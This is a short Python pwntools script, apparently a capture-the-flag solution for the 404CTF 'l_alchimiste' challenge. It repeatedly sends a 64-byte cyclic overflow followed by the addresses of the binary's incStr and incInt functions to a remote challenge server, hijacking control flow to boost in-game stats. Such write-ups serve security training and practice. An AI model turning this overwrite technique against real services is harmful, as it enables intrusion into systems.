from pwn import *

target = '../data/l_alchimiste'

context.binary = ELF(target, checksec=False)

#p = process(target, stdin=PTY, stdout=PTY)
io = remote('challenges.404ctf.fr', 30944)
#io = p

output = io.recv()

attack_code = b''

# Buy
io.sendline(b'1')
io.recv()

payload = b''
payload += cyclic(64)
payload += p64(context.binary.symbols['incStr'])

# STR + 50
for i in range(5):

    io.sendline(b'3')
    io.recv(timeout=2)

    io.sendline(payload)
    io.recv(timeout=2)

    io.sendline(b'2')
    io.recv(timeout=2)

payload = b''
payload += cyclic(64)
payload += p64(context.binary.symbols['incInt'])

# INT + 100
for i in range(10):

    io.sendline(b'3')
    io.recv(timeout=2)

    io.sendline(payload)
    io.recv(timeout=2)

    io.sendline(b'2')
    io.recv(timeout=2)

io.sendline(b'5')

print(io.recv(timeout=2))
print(io.recv(timeout=2))
